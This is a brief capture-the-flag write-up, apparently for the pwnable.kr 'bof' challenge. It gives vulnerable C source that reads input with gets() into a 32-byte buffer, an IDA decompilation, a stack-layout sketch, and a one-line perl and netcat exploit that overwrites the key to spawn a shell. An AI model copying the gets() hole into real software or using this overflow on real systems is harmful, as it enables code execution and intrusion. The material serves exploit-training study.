#BOF

<pre><code>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

</code></pre>


<pre><code>
int __cdecl func(int a1)
{
  char s; // [sp+1Ch] [bp-2Ch]@1
  int v3; // [sp+3Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  puts("overflow me : ");
  gets(&s);
  if ( a1 == -889275714 )
    system("/bin/sh");
  else
    puts("Nah..");
  return *MK_FP(__GS__, 20) ^ v3;
}
</code></pre>
i can found it by ida

so i supose stack structure


+---------------+ bp - 2ch
|               |
|               |
| overflow[32] |
|               |
|               |
+---------------+ bp - ch
|     v3        | 
+---------------+ bp
|    sfp(4byte) |
+---------------+
|     rtn(4byte)|
+---------------+
|     key       |
+---------------+

2ch = 44d

i overflow

44 + sfp(4byte) + rtn (4byte) + key value overwrite

so pwn code is

(perl -e 'print "a"x52 , "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000





